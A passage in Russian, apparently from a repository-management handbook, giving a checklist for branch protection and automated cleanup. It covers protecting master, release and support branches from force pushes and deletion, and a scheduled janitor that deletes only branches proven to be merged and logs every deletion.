   свипов. Строка в транскрипте — причина, по которой удаление можно защитить
   через месяц.

### Чеклист для репо, который это принимает

- [ ] `master` защищён: обязательное ревью, обязательные проверки, `do not allow
      force pushes`, `do not allow deletions`, и ограничения применены к админам
      тоже (`Do not allow bypassing the above settings`), потому что защита,
      которую обходят админы, защищает всех остальных.
- [ ] `release/*` и `support/*` защищены `do not allow deletions`.
- [ ] `Automatically delete head branches` включено — теперь безопасно, потому
      что выживающие классы защищены по имени, а не настройкой.
- [ ] Личные ветки живут под `users/`, чтобы никакой свип не принял их за
      депеловое.
- [ ] `bin/pairctl branch audit` (janitor) ходит по расписанию и отрапортовывает
      STALE и ANOMALY; удаляет только доказанно-смерженные смертные ветки и пишет
      строку на каждое удаление.

§19 сказала, что смерженная ветка раунда умирает конструкцией. §20 говорит то
же для каждого смертного класса — и называет то, что умирать не может никогда:
ствол, линии поддержки и ветка, смерженность которой никем не доказана.
